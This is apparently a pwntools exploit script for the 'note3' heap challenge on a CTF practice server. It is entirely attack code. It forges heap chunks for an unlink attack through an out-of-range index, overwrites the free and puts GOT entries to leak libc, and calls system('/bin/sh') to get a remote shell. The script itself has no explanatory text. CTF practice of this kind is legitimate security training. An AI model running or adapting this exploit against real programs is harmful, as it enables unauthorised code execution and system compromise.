#!/usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *
context(log_level = 'info', os='linux', arch='amd64')

# p = process("./note3")
p = remote("node3.buuoj.cn",25763)
elf = ELF("./note3")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def add(size,content):
	p.sendlineafter('>>\n','1')
	p.sendlineafter('1024)\n',str(size))
	p.sendlineafter('content:\n',content)

def edit(idx,content):
	p.sendlineafter('>>\n','3')
	p.sendlineafter('note:\n',str(idx))
	p.sendlineafter('content:\n',content)

def free(idx):
	p.sendlineafter('>>\n','4')
	p.sendlineafter('note:\n',str(idx))

def show():
	p.sendlineafter('>>\n','2')


for _ in range(3):
	add(0x50,'a'*8)
add(0x90,'b'*8)
for _ in range(3):
	add(0x50,'a'*8)

edit(2,'skyedidi')

ptr = 0x6020d8
payload = p64(0) + p64(0x51)
payload += p64(ptr-0x18) + p64(ptr-0x10)
payload = payload.ljust(0x50,'a')
payload += p64(0x50) + p64(0xa0)
edit(0x8000000000000000 - 0x10000000000000000,payload)
free(3)

payload = 'skyedidi' + p64(elf.got['free']) + p64(elf.got['puts'])
payload += p64(0x6020c0)
edit(2,payload)

edit(0,p64(elf.plt['puts'])[:7])
free(1)

puts_leak = u64(p.recv(6).ljust(8,'\x00'))
log.info("puts_leak:"+hex(puts_leak))
libc_base = puts_leak - 0x06f690#libc.sym['puts']
system = libc_base + 0x045390#libc.sym['system']
binsh = libc_base + 0x18cd57#next(libc.search('/bin/sh'))

edit(0,p64(system)[:7])

payload = 'skyedidi' + p64(elf.got['free']) + p64(elf.got['puts'])
payload += p64(binsh)
edit(2,payload)

free(2)


# gdb.attach(p)


p.interactive()
